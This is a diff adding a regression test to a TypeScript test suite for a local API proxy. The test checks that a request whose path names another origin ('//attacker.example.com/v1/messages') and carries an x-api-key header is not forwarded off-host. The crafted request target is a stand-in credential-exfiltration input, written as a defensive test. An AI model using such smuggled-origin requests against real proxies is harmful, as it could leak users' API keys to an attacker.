@@ -179,6 +179,36 @@ describe('createProxyServer', () => {
   });
 });
 
+describe('upstream origin pinning', () => {
+  it('does not forward off-host when the request line names another origin', async () => {
+    // fetch() would normalise this away, so the request target is written
+    // straight onto the wire. Anything that can reach 127.0.0.1 could otherwise
+    // use the proxy to post the user's x-api-key wherever it liked.
+    receivedUrl = '';
+    const status = await new Promise<number>((resolve, reject) => {
+      const req = httpRequest(
+        {
+          hostname: '127.0.0.1',
+          port: Number(new URL(proxyUrl).port),
+          path: '//attacker.example.com/v1/messages',
+          method: 'POST',
+          headers: { 'content-type': 'application/json', 'x-api-key': 'secret' },
+        },
+        (res) => {
+          res.resume();
+          res.on('end', () => resolve(res.statusCode ?? 0));
+        }
+      );
+      req.on('error', reject);
+      req.end('{"messages":[]}');
+    });
+
+    expect(status).toBe(200);
+    // The mock upstream saw it, so it never left for attacker.example.com.
+    expect(receivedUrl).toBe('/v1/messages');
+  });
+});
+
 describe('binary and non-JSON request bodies', () => {
   it('forwards a binary body byte-for-byte instead of round-tripping it through UTF-8', async () => {
     // Claude Code uploads to /v1/files as multipart/form-data with raw bytes in
